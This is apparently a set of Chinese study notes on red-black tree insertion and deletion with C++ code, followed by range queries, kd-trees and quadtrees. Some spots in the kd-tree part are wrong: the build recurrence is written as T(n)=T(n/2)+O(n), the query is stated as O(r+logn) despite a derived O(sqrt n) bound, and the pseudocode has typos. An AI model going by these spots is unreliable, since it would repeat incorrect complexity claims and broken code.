<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; BinNodePosi(T) RedBlack&lt;T&gt;::insert ( <span class="keyword">const</span> T&amp; e ) &#123; <span class="comment">//将e插入红黑树</span></span><br><span class="line">   BinNodePosi(T) &amp; x = search ( e ); <span class="keyword">if</span> ( x ) <span class="keyword">return</span> x; <span class="comment">//确认目标不存在（留意对_hot的设置）</span></span><br><span class="line">   x = <span class="keyword">new</span> BinNode&lt;T&gt; ( e, _hot, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">-1</span> ); _size++; <span class="comment">//创建红节点x：以_hot为父，黑高度-1</span></span><br><span class="line">   solveDoubleRed ( x ); <span class="keyword">return</span> x ? x : _hot-&gt;parent; <span class="comment">//经双红修正后，即可返回</span></span><br><span class="line">&#125; <span class="comment">//无论e是否存在于原树中，返回时总有x-&gt;data == e</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因新节点的引入而导致父子节点同为红色的情况，称为双红。为修正双红缺陷，可调用<code>solveDoubleRed(x)</code>。每引入一个关键码，该接口都可能调用多次。在此过程中，当前节点$x$的兄弟以及两个孩子始终均为黑色。</p>
<p>将$x$的父亲与祖父分别记作$p$和$g$。既然此前的红黑树合法，那么作为红节点的父亲，$g$必然存在，且为黑色。$g$作为内部节点，其另一孩子(即$p$的孩子，$x$的叔父)也必然存在，记作$u$。以下将视节点$u$的颜色不同，分两类情况处理。</p>
<p><strong>双红修正(RR-1)</strong></p>
<p>首先，考查$u$为黑色的情况。此时，$x$的兄弟、两个孩子的黑高度均与$u$相等。以下为其中的两种可能：</p>
<p><img src="https://i.loli.net/2019/09/14/USMY7jIRwepvfE1.png"></p>
<p>此时红黑树条件的违反，从B树等效来看，同一节点不应包含紧邻的红色关键码。只需令黑色关键码和相邻紧邻的红色关键码互换颜色，从红黑树的角度来看，等效于按照中序遍历序列，对节点$x$、$p$和$g$及其四棵子树做一次局部3+4重构。调整之后，局部子树的黑高度将复原，全树的平衡必然得以恢复。同时，新子树的根节点为黑色，也不致于引发新的双红现象。至此，整个插入操作遂告完成。</p>
<p><strong>双红修正(RR-2)</strong></p>
<p>再考查节点$u$为红色的情况，此时，$u$的左、右孩子非空且均为黑色，其黑高度必与x的兄弟以及两个孩子相等。以下为其中的两种可能：</p>
<p><img src="https://i.loli.net/2019/09/14/pF3Y1nMVKxT9SDQ.png"></p>
<p>从B树的角度来看，亦该节点超过4度而发生上溢。从红黑树的角度来看，只需将红节点$p$和$u$转为黑色，黑节点g转为红色，$x$保持红色，等效于在B树中的节点分裂操作，关键码$g$上升一层。</p>
<p>如此调整之后局部的黑高度复原，然而子树根节点转为红色后，可能再次引发双红现象，等效于B树在关键码被移出并归入上层节点后进而引发上层节点的上溢，即上溢的向上传播。</p>
<p>等效地将g视为刚插入的节点，分以上两类情况如法处置。每经过这样一次迭代，节点$g$都将在B树中上升一层，而在红黑树中存在双红缺陷的位置也将相应地上升两层，故累计至多迭代$O(logn)$次。</p>
<p>若最后一步迭代导致树根的分裂，并由$g$独立地构成新的树根节点，则应强行转为黑色，如此，全树的黑高度随即增加一层。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">void</span> RedBlack&lt;T&gt;::solveDoubleRed ( BinNodePosi(T) x ) &#123; <span class="comment">//x当前必为红</span></span><br><span class="line">   <span class="keyword">if</span> ( IsRoot ( *x ) ) <span class="comment">//若已（递归）转至树根，则将其转黑，整树黑高度也随之递增</span></span><br><span class="line">      &#123;  _root-&gt;color = RB_BLACK; _root-&gt;height++; <span class="keyword">return</span>;  &#125; <span class="comment">//否则，x的父亲p必存在</span></span><br><span class="line">   BinNodePosi(T) p = x-&gt;parent; <span class="keyword">if</span> ( IsBlack ( p ) ) <span class="keyword">return</span>; <span class="comment">//若p为黑，则可终止调整。否则</span></span><br><span class="line">   BinNodePosi(T) g = p-&gt;parent; <span class="comment">//既然p为红，则x的祖父必存在，且必为黑色</span></span><br><span class="line">   BinNodePosi(T) u = uncle ( x ); <span class="comment">//以下，视x叔父u的颜色分别处理</span></span><br><span class="line">   <span class="keyword">if</span> ( IsBlack ( u ) ) &#123; <span class="comment">//u为黑色（含NULL）时 //*DSA*/printf(&quot;  case RR-1:\n&quot;);</span></span><br><span class="line">      <span class="keyword">if</span> ( IsLChild ( *x ) == IsLChild ( *p ) ) <span class="comment">//若x与p同侧（即zIg-zIg或zAg-zAg），则</span></span><br><span class="line">         p-&gt;color = RB_BLACK; <span class="comment">//p由红转黑，x保持红</span></span><br><span class="line">      <span class="keyword">else</span> <span class="comment">//若x与p异侧（即zIg-zAg或zAg-zIg），则</span></span><br><span class="line">         x-&gt;color = RB_BLACK; <span class="comment">//x由红转黑，p保持红</span></span><br><span class="line">      g-&gt;color = RB_RED; <span class="comment">//g必定由黑转红</span></span><br><span class="line"><span class="comment">///// 以上虽保证总共两次染色，但因增加了判断而得不偿失</span></span><br><span class="line"><span class="comment">///// 在旋转后将根置黑、孩子置红，虽需三次染色但效率更高</span></span><br><span class="line">      BinNodePosi(T) gg = g-&gt;parent; <span class="comment">//曾祖父（great-grand parent）</span></span><br><span class="line">      BinNodePosi(T) r = FromParentTo ( *g ) = rotateAt ( x ); <span class="comment">//调整后的子树根节点</span></span><br><span class="line">      r-&gt;parent = gg; <span class="comment">//与原曾祖父联接</span></span><br><span class="line">   &#125; <span class="keyword">else</span> &#123; <span class="comment">//若u为红色 </span></span><br><span class="line">      p-&gt;color = RB_BLACK; p-&gt;height++; <span class="comment">//p由红转黑</span></span><br><span class="line">      u-&gt;color = RB_BLACK; u-&gt;height++; <span class="comment">//u由红转黑</span></span><br><span class="line">      <span class="keyword">if</span> ( !IsRoot ( *g ) ) g-&gt;color = RB_RED; <span class="comment">//g若非根，则转红</span></span><br><span class="line">      solveDoubleRed ( g ); <span class="comment">//继续调整g（类似于尾递归，可优化为迭代形式）</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>旋转次数</th>
<th>染色次数</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>u为黑</td>
<td>1~2</td>
<td>2</td>
<td>调整随即完成</td>
</tr>
<tr>
<td>u为红</td>
<td>0</td>
<td>3</td>
<td>或再次双红，但必上升两层</td>
</tr>
</tbody></table>
<p>对第一种情况，只需做一轮修正，后一种情况虽有可能需要反复修正，但由于修正位置的高度会严格单调上升，故总共不过$O(logn)$轮。每一轮只涉及常数次节点旋转或染色操作。</p>
<p>因此，在节点插入后的双红修正，累计耗时不会超过$O(logn)$。即便计入此前的关键码查找操作，红黑树的每次节点插入操作都可在$O(logn)$时间内完成。</p>
<h2 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">bool</span> RedBlack&lt;T&gt;::remove ( <span class="keyword">const</span> T&amp; e ) &#123; <span class="comment">//从红黑树中删除关键码e</span></span><br><span class="line">   BinNodePosi(T) &amp; x = search ( e ); <span class="keyword">if</span> ( !x ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//确认目标存在（留意_hot的设置）</span></span><br><span class="line">   BinNodePosi(T) r = removeAt ( x, _hot ); <span class="keyword">if</span> ( ! ( --_size ) ) <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//实施删除</span></span><br><span class="line"><span class="comment">// assert: _hot某一孩子刚被删除，且被r所指节点（可能是NULL）接替。以下检查是否失衡，并做必要调整</span></span><br><span class="line">   <span class="keyword">if</span> ( ! _hot ) <span class="comment">//若刚被删除的是根节点，则将其置黑，并更新黑高度</span></span><br><span class="line">      &#123; _root-&gt;color = RB_BLACK; updateHeight ( _root ); <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line"><span class="comment">// assert: 以下，原x（现r）必非根，_hot必非空</span></span><br><span class="line">   <span class="keyword">if</span> ( BlackHeightUpdated ( *_hot ) ) <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//若所有祖先的黑深度依然平衡，则无需调整</span></span><br><span class="line">   <span class="keyword">if</span> ( IsRed ( r ) ) <span class="comment">//否则，若r为红，则只需令其转黑</span></span><br><span class="line">      &#123; r-&gt;color = RB_BLACK; r-&gt;height++; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line"><span class="comment">// assert: 以下，原x（现r）均为黑色</span></span><br><span class="line">   solveDoubleBlack ( r ); <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//经双黑调整后返回</span></span><br><span class="line">&#125; <span class="comment">//若目标节点存在且被删除，返回true；否则返回false</span></span><br></pre></td></tr></table></figure>
<p>为删除关键码e，首先调用<code>BST::search(e)</code>进行查找，若查找成功，则调用内部接口<code>removeAt(x)</code>删除。$x$为实际被摘除者，其父亲为$r$，而$r$的兄弟首次必然为NULL。根据红黑树的定义，关键码$e$必然有左、右子树，$x$为关键码$e$的后继，即为关键码$e$的右子树中最左者，必定左孩子为空。</p>
<p>因随后的复衡位置可能逐层上升，可等效理解为:$w$为一棵与$r$等高的红黑子树，随x一并摘除。</p>
<p>此时红之子、父必黑和全树黑高度相同条件未必满足。</p>
<p>若$x$为原树根，则无论$r$颜色如何，只需将其置为黑色并更新黑高度即可。不妨假定，$x$的父亲$p$存在。</p>
<p><img src="https://i.loli.net/2019/09/14/fY3hx9C2E1doqr6.png"></p>
<p>$x$为红色，则在摘除子树$w$之后，并将$x$替换为$r$之后，局部子树的黑高度即可复原。即便$x$为黑色，只需在删除之后将$r$翻转为黑色，亦可使局部子树的高度复原。若$x$和$r$均为黑色，则在删除操作之后，局部子树的黑高度将上升一个单位。</p>
<p>被删除节点$x$及其替代者同为黑色的情况，称为双黑，此时，需调用<code>solveDoubleBlack(x)</code>予以修正。为此，需考查原黑节点$x$的兄弟$s$(必然存在，但可能是外部节点)，按照$s$和$p$的不同颜色，按四种情况分别处理。</p>
<p><strong>双黑修正(BB-1)</strong></p>
<p>若$s$至少有一个红孩子$t$，既然节点$x$的另一孩子<code>w=NULL</code>,节点x删除后可等效为B树中关键码$x$原属的节点发生下溢，此时，$t$和$s$必然属于B树的同一节点，该节点就是下溢节点的兄弟。参照B树的调整方法，下溢节点从父节点借出一个关键码，然后父节点从下溢节点的兄弟节点借出一个关键码。</p>
<p><img src="https://i.loli.net/2019/09/14/bmKkAOzeqQ78p2l.png"></p>
<p>其中六边形节点的颜色不确定，可为红色也可为黑色。若$p$为红，则问号之一为黑，若$p$为黑，则自成一个节点。</p>
<p>从红黑树的角度来看，上述调整过程等效于对节点$t$、$s$、$p$实施3+4重构。若这三个节点按照中序遍历序列重命名为$a$、$b$、$c$,则还需将$a$和$c$染成黑色，$b$则继承此前的颜色。整个过程中节点$r$保持黑色不变。</p>
<p><strong>双黑修正(BB-2-A)</strong></p>
<p>若$s$为黑，且两个孩子均为黑，根据$p$的颜色不同，又存在两种情况，先讨论$p$为红的情况</p>
<p><img src="https://i.loli.net/2019/09/14/F9lHps87O24BI6i.png"></p>
<p>在对应的B树中，关键码$x$的删除导致其所属的节点下溢，但因此时关键码$s$所在的节点只有两个分支，所以下溢节点无法从父节点借出关键码。按照B树平衡算法，应该将关键码$p$取出并下降一层，并将原左、右孩子合并为一个节点。从红黑树的角度来看，这等效于$s$和$p$颜色互换。</p>
<p>经过以上处理，红黑树所有条件均在此局部得以恢复。另外，关键码$p$原为红色，在p的左侧或右侧必然还有一个黑色关键码(当然，不可能左、右兼有)，在关键码$p$从其中取出之后，不致引发新的下溢。至此，红黑树的条件亦必在全局得以恢复，删除操作即告完成。</p>
<p><strong>双黑修正(BB-2-B)</strong></p>
<p>同样，在对应的B树中，因关键码$x$的删除，导致其所属节点发生下溢。可将下溢节点与其兄弟合并，从红黑树来看，这等效于节点$s$由黑转红。</p>
<p>经过以上处理后，红黑树所有的条件都将在此局部得以恢复。</p>
<p>既然$s$和$x$在此前均为黑色，故$p$原所属的B树节点必然仅含$p$这一个关键码，于是在$p$被借出后，该节点必将发生下溢，从而有待于后续的进一步修正。从红黑树的角度看，此时的状态等效于节点$p$的(黑色父亲)刚被删除。</p>
<p><img src="https://i.loli.net/2019/09/14/ELKZVwIXD9CoghB.png"></p>
<p>这也是在双黑修正过程中唯一需要再次迭代的可能，但下溢的位置不断上升，故至多迭代$O(logn)$次必然终止。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">void</span> RedBlack&lt;T&gt;::solveDoubleBlack ( BinNodePosi(T) r ) &#123;</span><br><span class="line">   BinNodePosi(T) p = r ? r-&gt;parent : _hot; <span class="keyword">if</span> ( !p ) <span class="keyword">return</span>; <span class="comment">//r的父亲</span></span><br><span class="line">   BinNodePosi(T) s = ( r == p-&gt;lc ) ? p-&gt;rc : p-&gt;lc; <span class="comment">//r的兄弟</span></span><br><span class="line">   <span class="keyword">if</span> ( IsBlack ( s ) ) &#123; <span class="comment">//兄弟s为黑</span></span><br><span class="line">      BinNodePosi(T) t = <span class="literal">NULL</span>; <span class="comment">//s的红孩子（若左、右孩子皆红，左者优先；皆黑时为NULL）</span></span><br><span class="line">      <span class="keyword">if</span> ( IsRed ( s-&gt;rc ) ) t = s-&gt;rc; <span class="comment">//右子</span></span><br><span class="line">      <span class="keyword">if</span> ( IsRed ( s-&gt;lc ) ) t = s-&gt;lc; <span class="comment">//左子</span></span><br><span class="line">      <span class="keyword">if</span> ( t ) &#123; <span class="comment">//黑s有红孩子：BB-1</span></span><br><span class="line">         RBColor oldColor = p-&gt;color; <span class="comment">//备份原子树根节点p颜色，并对t及其父亲、祖父</span></span><br><span class="line">      <span class="comment">// 以下，通过旋转重平衡，并将新子树的左、右孩子染黑</span></span><br><span class="line">         BinNodePosi(T) b = FromParentTo ( *p ) = rotateAt ( t ); <span class="comment">//旋转</span></span><br><span class="line">         <span class="keyword">if</span> ( HasLChild ( *b ) ) &#123; b-&gt;lc-&gt;color = RB_BLACK; updateHeight ( b-&gt;lc ); &#125; <span class="comment">//左子</span></span><br><span class="line">         <span class="keyword">if</span> ( HasRChild ( *b ) ) &#123; b-&gt;rc-&gt;color = RB_BLACK; updateHeight ( b-&gt;rc ); &#125; <span class="comment">//右子</span></span><br><span class="line">         b-&gt;color = oldColor; updateHeight ( b ); <span class="comment">//新子树根节点继承原根节点的颜色</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">//黑s无红孩子</span></span><br><span class="line">         s-&gt;color = RB_RED; s-&gt;height--; <span class="comment">//s转红</span></span><br><span class="line">         <span class="keyword">if</span> ( IsRed ( p ) ) &#123; <span class="comment">//BB-2R</span></span><br><span class="line">            p-&gt;color = RB_BLACK; <span class="comment">//p转黑，但黑高度不变</span></span><br><span class="line">         &#125; <span class="keyword">else</span> &#123; <span class="comment">//BB-2B</span></span><br><span class="line">            p-&gt;height--; <span class="comment">//p保持黑，但黑高度下降</span></span><br><span class="line">            solveDoubleBlack ( p ); <span class="comment">//递归上溯</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123; <span class="comment">//兄弟s为红：BB-3</span></span><br><span class="line">      s-&gt;color = RB_BLACK; p-&gt;color = RB_RED; <span class="comment">//s转黑，p转红</span></span><br><span class="line">      BinNodePosi(T) t = IsLChild ( *s ) ? s-&gt;lc : s-&gt;rc; <span class="comment">//取t与其父s同侧</span></span><br><span class="line">      _hot = p; FromParentTo ( *p ) = rotateAt ( t ); <span class="comment">//对t及其父亲、祖父做平衡调整</span></span><br><span class="line">      solveDoubleBlack ( r ); <span class="comment">//继续修正r处双黑——此时的p已转红，故后续只能是BB-1或BB-2R</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>双黑修正(BB-3)</strong></p>
<p>最后，考虑$s$为红的情况</p>
<p>此时作为红节点$s$的父亲，节点$p$必定为黑色，同时,$s$的两个孩子也为黑色。</p>
<p>从B树的角度来看，只需令关键码$s$与$p$互换颜色，即可得到一棵与之完全等价的B树。从红黑树的角度来看，这一转换对应于以节点$p$为轴做一次旋转，并交换节点$s$和$p$的颜色。</p>
<p>经如此处理之后，子树$r$的黑高度并未恢复，缺陷位置也并未上升。</p>
<p><img src="https://i.loli.net/2019/09/14/OJHFB9piry1g8dl.png"></p>
<p>此时r有了一个新的黑兄弟，故转化为前面的情况，由于$p$为红色，所以取决于$S$的孩子颜色，若有一为红，则BB-1,若均为黑，则BB-2R。</p>
<p>再经过一轮调整后，红黑树性质必然全局恢复。</p>
<p><strong>复杂度</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>旋转次数</th>
<th>染色次数</th>
<th>此后</th>
</tr>
</thead>
<tbody><tr>
<td>黑$s$有红子$t$</td>
<td>1~2</td>
<td>3</td>
<td>调整随即完成</td>
</tr>
<tr>
<td>黑$s$无红子，$p$红</td>
<td>0</td>
<td>2</td>
<td>调整随即完成</td>
</tr>
<tr>
<td>黑$s$无红子，$p$黑</td>
<td>0</td>
<td>1</td>
<td>必然再次双黑，但将上升一层</td>
</tr>
<tr>
<td>红$s$</td>
<td>1</td>
<td>2</td>
<td>转化为1或者2R</td>
</tr>
</tbody></table>
<p>红黑树的每一删除操作都将在$O(logn)$时间内完成，其中至多做$O(logn)$,一次3+4重构，一次单旋。</p>
<p>就分摊意义而言，红黑树重平衡过程中所做的重染色操作不过常数次。</p>
<h1 id="kd树"><a href="#kd树" class="headerlink" title="kd树"></a>kd树</h1><h2 id="一维"><a href="#一维" class="headerlink" title="一维"></a>一维</h2><p>给定直线上$l$上的点集$P={p_{0},p_{1},p_{2},p_{3},…,p_{n-1}}$,对于任一区间$[x_1,x_2]$，</p>
<ul>
<li>计数：有多少点落在其中？</li>
<li>报告：枚举所有落在其中的点</li>
</ul>
<p>很多实际问题可归结为以上问题，比如在校友数据库中查找1970到2000级的学生，或者查询IP介于166.111.68.1至168.111.68.255之间的在线节点等。</p>
<p><strong>蛮力算法</strong></p>
<p>表面看来，一维范围查询只需遍历点集$P$,并逐个花费$O(1)$时间判断各点是否落在区间内，如此总体运行时间为$O(n)$。</p>
<p>当点集规模大到需要借助外部存储器时，遍历整个点集必然引发大量I/O操作。</p>
<p>另外，当数据点的坐标分布范围较大时，通常所查询的点在整个输入点集中仅占比较大甚至极低的比例。</p>
<p>在典型的范围查询应用中，输入点集数据和查询区域特点迥异。一方面，输入点集$P$通常会在相当长的时间内保持相对固定，即以批处理或离线形式给出的数据。同时，往往需要针对大量随机定义的区间$R$，即以在线方式给出地数据，反复地进行查询。可通过适当的预处理将输入点集提前整理和组织为某种适当的数据结构，来有效提高此后各次查询的效率。</p>
<p><strong>有序向量</strong></p>
<p>最为简便易行的预处理方法，就是在$O(nlogn)$时间内将点集$P$组织为一个有序向量。</p>
<p>此后，对于任何$R=[x_1,x_2]$,首先利用有序向量的查找算法，在$O(logn)$时间内找到不大于$x2$的最大点$p_t$，自右向左地遍历向量中各点，直至第一个离开查询范围的$p_s$。其间经过的所有点均属于区间范围，故可以直接输出。</p>
<p>如此，在每一次查询中,$p_t$的定位需要$O(log n)$。若接下来的遍历总共报告出$r$个点，则总体查询成本为$O(r+logn)$。</p>
<h2 id="二维"><a href="#二维" class="headerlink" title="二维"></a>二维</h2><p>在实际应用中往往需要同时对多个维度做范围查找。以人事数据库查询为例，诸如”年龄介于某个区间且工资介于某个区间”之类的组合查询非常普遍。若将年龄和工资分别表示为两个正交维度，则人事数据库中的记录将对应于二维平面上的点。针对某一相对固定点集的范围查询，其查询范围可描述为矩形$R=[x_1,x_2][y_1,y_2]$。</p>
<p>这时候，以上基于二分查找的方法并不能直接推广至二维情况。</p>
<p>不妨在$O(nlogn)$时间内将输出点集组织并转化为二叉搜索树。尽管其中各节点的关键码可能重复，但是每个关键码至多重复一次，总体依然只需$O(n)$时间。尽管相对常规的二叉搜索树多出一层，但树高依然是$O(logn)$。</p>
<p><strong>查询算法</strong></p>
<p><img src="https://i.loli.net/2019/11/15/u6mtMnZhkaFCWJ7.png"></p>
<p>例如，设查询区间为$[1,23]$</p>
<p>首先，在树中查找这一区间的左、右端点$1$和$23$，分别终止与叶节点$3$和$24$。</p>
<p>接下来，考查这两个叶节点共同祖先中的最低者，即所谓的最低共同祖先(lowest common ancestor,LCA)，具体地亦即</p>
<p>$lca(3,24)=15$</p>
<p>然后，沿着这一共同祖先节点出发，分别重走一遍通往$3$和$24$的路径。在沿着$path(3)/path(24)$下行的过程中，忽略所有的左/右转，而对于每一次左/右转都需要遍历对应的右子树/左子树，并将其中的叶节点悉数报告出来。沿着$path(3)$被报告出来的叶节点子集，依次为：</p>
<p>$9,12,14,15$ 、$4,7$、$3$</p>
<p>沿着$path(24)$报告出来的叶节点子集依次为${17,20}$、${22}$</p>
<p>在每一次查询过程中，针对左、右端点的两次查找以及其路径的重走，各自不过$O(logn)$时间。在树的每一层次上，两条路径各自至多报告一棵子树，故累计不过$O(logn)$棵。为枚举这些子树中的点，对它们的遍历累计不超过$O(r)$时间，其中$r$为实际报告的点数。</p>
<p>每次查询可在$O(r+logn)$时间内完成。该查询算法的运行时间也与输出规模相关，故同样属于输出敏感的算法。</p>
<p><strong>kd树</strong></p>
<p>循着用二叉平衡搜索树实现一维查询的构思，可将待查询的二维点集组织为所谓的kd树结构。在任何的维度下，kd树都是一棵递归定义的二叉树。</p>
<p>以二维为例，就2d树的原理以及构造和查询算法做一介绍。</p>
<p>2d树中的每一个节点都对应于二维平面上的某一矩形区域，且其边界斗鱼坐标轴平行。</p>
<p>同层节点对应的矩形区域经合并之后恰好可覆盖整个平面，同时其间又不得有任何交叠。统一约定，每个矩形区域的左边和底边开放，右边和底边封闭。</p>
<h2 id="构造算法"><a href="#构造算法" class="headerlink" title="构造算法"></a>构造算法</h2><p>树根必然对应于整个平面，若$P$为输入点集与树中当前节点所对应的矩形区域的交集(即落在其中的所有点)，则可递归地将该矩形区域切分为两个矩形子区域，且各包含$P$中一半点。</p>
<p>若当前节点深度为偶(奇)树，则沿垂直(水平)方向切分，所得子区域随同包含的输入点分别构成左、右孩子，如此不断直到子区域仅含单个输入点。每次切分都在中位点(按照对应坐标排序中居中者)处进行，以保证全树高度不超过$O(logn)$。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">KdTree* <span class="title">buildKdTree</span><span class="params">(P,d)</span></span>&#123;<span class="comment">//在深度为d的层次，构造一棵对应于(子)集合P的2d树</span></span><br><span class="line">  <span class="keyword">if</span>(p==&#123;p&#125;) <span class="keyword">return</span> CreateLeaf(p);<span class="comment">//递归基</span></span><br><span class="line">  root=CreateKdNode();<span class="comment">//创建(子)树根</span></span><br><span class="line">  root-&gt;splitDirection=Even(d)?VERTICAQL:HORITIZAL;<span class="comment">//确定划分方向</span></span><br><span class="line">  root-&gt;splitLine=FindMedian(root-&gt;SplitDirection,P);<span class="comment">//确定中位点</span></span><br><span class="line">  (P1,P2)=Divide(P,root-&gt;splitDirection,root-&gt;splitLine);<span class="comment">//子集划分</span></span><br><span class="line">  root-&gt;lc=buildKdTree(P1,d+<span class="number">1</span>);<span class="comment">//在深度为d+1的层次，递归构造左子树</span></span><br><span class="line">  root-&gt;rc=buildKdTree(p2,d+<span class="number">1</span>);<span class="comment">//在深度为d+1的层次，递归构造右子树</span></span><br><span class="line">  <span class="keyword">return</span> root;<span class="comment">//返回子树的树根</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例如</p>
<p><img src="https://i.loli.net/2019/11/15/vAWzLa3b2KCUOYX.png"></p>
<p>第一轮切分以水平方向的中位点$C$为界，将整个平面分为左、右两半，点集$P$也相应地划分为子集${A,B,C,G}$和${D,E,F}$，随同对应的半平面，被指派给深度为1的两个节点。</p>
<p>第二轮切分对于左半平面以及对应的子集${A,B,C,G}$,以垂直方向的中位点$B$为界，将其分为上下两半，并分别随同子集${B,G}$和${A,C}$,指派给深度为2的一对节点；对于右半平面及其对应的子集${D,E,F}$,以垂直方向的中位点$F$为界，将其分为上、下两半，并随同子集${E,F}$和${D}$,指派给深度为2的另一对节点。</p>
<p>最后一轮切分对树中含有至少两个输入点的三个深度为2的节点，分别沿水平方向的中位点，将他们分为左、右两半，并随同对应的子集分配给三对深度为3的节点。至此，所有叶节点均只包含单个输入点，对平面的划分遂告完成，同时与原输入点集$P$对应的一棵2d树也构造完毕。</p>
<blockquote>
<p>若中位点可在线性时间内确定，则kd树构造算法buildKdTree()的总体执行时间可改进至$O(nlogn)$，其中$n$为点集输入规模</p>
</blockquote>
<p>在该分治问题中，每个问题(kd树的构造)都可在线性时间内均衡地划分为两个子问题，而且每个子问题地解都能在常数时间内合并原问题的解，于是，其时间复杂度$T(n)$对应的递推式：</p>
<p>$T(n)=T(n/2)+O(n)$</p>
<p>$T(n)=O(nlogn)$</p>
<blockquote>
<p>基于2d树的范围查询</p>
</blockquote>
<p>经过如上预处理，将待处理点集$P$转化为一棵2树之后，对于任一矩形查询区域$R$,范围查询的过程均从树根节点出发，按如下方式递归进行。</p>
<p>在任一节点$v$处，若子树$v$仅含单个节点，则意味着矩形区域$v$中仅覆盖单个输入点，此时可直接判断该点是否落在$R$内。否则，不妨假设矩形区域$v$含有多个输入点。</p>
<p>此时，视矩形区域$v$与查询区域$R$的相对位置，分为三种情况</p>
<ul>
<li>若矩形区域$v$完全包含于$R$内，则其中所有的输入点均落在$R$内，于是只需遍历一趟子树$v$，即可报告这部分输入点</li>
<li>若二者相交，则有必要深入到$v$的左、右子树中，继续递归地查询</li>
<li>若二者彼此分离，则子集$v$中的点不可能落在$R$内，对应的递归分支至此即可终止</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kdSearch&#123;</span><br><span class="line">  <span class="keyword">if</span>(isLeaf(v))</span><br><span class="line">    &#123;<span class="keyword">if</span>(inside(v,R) report(v),<span class="keyword">return</span>;)&#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span>(region(v-&gt;lc) in R )</span><br><span class="line">    reportSubtree(v-&gt;lc);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(region(v-&gt;lc) intersect R != emptyset)</span><br><span class="line">    KdSearch(v-&gt;lc,R);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span>(region(v-&gt;rc) in R)</span><br><span class="line">    reportSubTree(v-&gt;rc);</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span>(region(v-&gt;rc) intersect R!=emptyset)</span><br><span class="line">    Kdsearch(v-rc,R);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在树中某一节点发生递归，当且仅当与该节点对应的子区域，与查询边界相交</p>
</blockquote>
<p>按照该算法的控制逻辑，只要当前子区域与$R$的边界相交时，即会发生递归；反之，无论是当前子区域是完全处于$R$之内(直接遍历当前子树并枚举其中的点)还是完全处于$R$之外(当前递归实例直接返回)，都不会发生递归。</p>
<blockquote>
<p>若令$Q(n)=$规模为$n$的子树中与查询边界相交的子区域(节点总数)，则有$Q(n)=2+2Q(n/4)=O(\sqrt n)$</p>
</blockquote>
<p>设$R$为任一查询区域，根据其对应子区域与$R$边界的相交情况，kd树中的所有节点可划分为以下几类：</p>
<ul>
<li>与$R$的边界不相交</li>
<li>只与$R$的一条边相交</li>
<li>同时与$R$的多条边相交</li>
</ul>
<p>根据定义，kd树自顶而下地经过$k$层，切分的维度方向即循环一轮。因此，不妨考查与$R$边界相交的任一节点，以及该节点起向下的$k$代子孙节点。对于2d树而言，也就是考查与R边相交的任一节点，以及它的$2$个子辈节点(各自大致包含$n/2$个点)和4个孙辈节点(各自大致包含n/4个点)。</p>
<p>无论这四个孙辈节点的相对位置和大小如何，该直线至多与其中的$2$个相交;反过来，至少有两个节点(子区域)不再发生递归。于是，可得到以下递归关系：</p>
<p>$Q(n) \leq 2+2Q(n/4)$</p>
<p>再结合边界条件</p>
<p>$Q(1)=1$</p>
<p>$Q(n)=\sqrt n$</p>
<p>以上未统计第二类节点，这一类节点只占少数，渐进意义而言并不影响总体的上界。</p>
<blockquote>
<p>kdSearch()的实际运行时间为$O(r+logn)$</p>
</blockquote>
<p>从递归的角度来看，若忽略对<code>reportSubtree()</code>的调用，kd树范围查询算法的每一递归实例本身仅需$O(1)$时间。查询需要$O(\sqrt n)$时间。</p>
<p><code>reportSubtree()</code>是通过遍历子树$v$，在线性时间内枚举其中的命中点。整个算法对该例程的调用累计时间应线性正比于输出规模$ O(r)$。</p>
<p>kd树中节点$v$所对应的矩形区域即便与查询范围$R$相交，其中所含输入点也不见得会落在$R$内。比如在极端的情况下，$v$中可能包含大量的输入点，但却没有一个落在$R$内，在此类情况下所做的递归都是不必进行的。</p>
<p>可在依然保持各边平行于坐标轴，同时包含输入点子集不变的前提下，尽可能地收缩各矩形子区域，等效于将原来的矩形替换为仍然覆盖其中所有输入点的最小矩形。</p>
<p><strong>四叉树</strong></p>
<p>四叉树是2d树的简化形式，其简化策略为：</p>
<ol>
<li>直接沿区域的(水平或区域平分)，从而省略了中位点的计算</li>
<li>沿垂直方向切处的每一对节点(各自再沿着水平方向切分)都经合并后归入其父节点</li>
<li>被合并的节点即便原先(因所含的输入点不足两个)而为继续切分，在此也需强行(沿水平方向)切分一次</li>
</ol>
<p>与kd树不同，四叉树可能包含大量的空节点，此类节点的规模无法由输入规模$n$界定。</p>
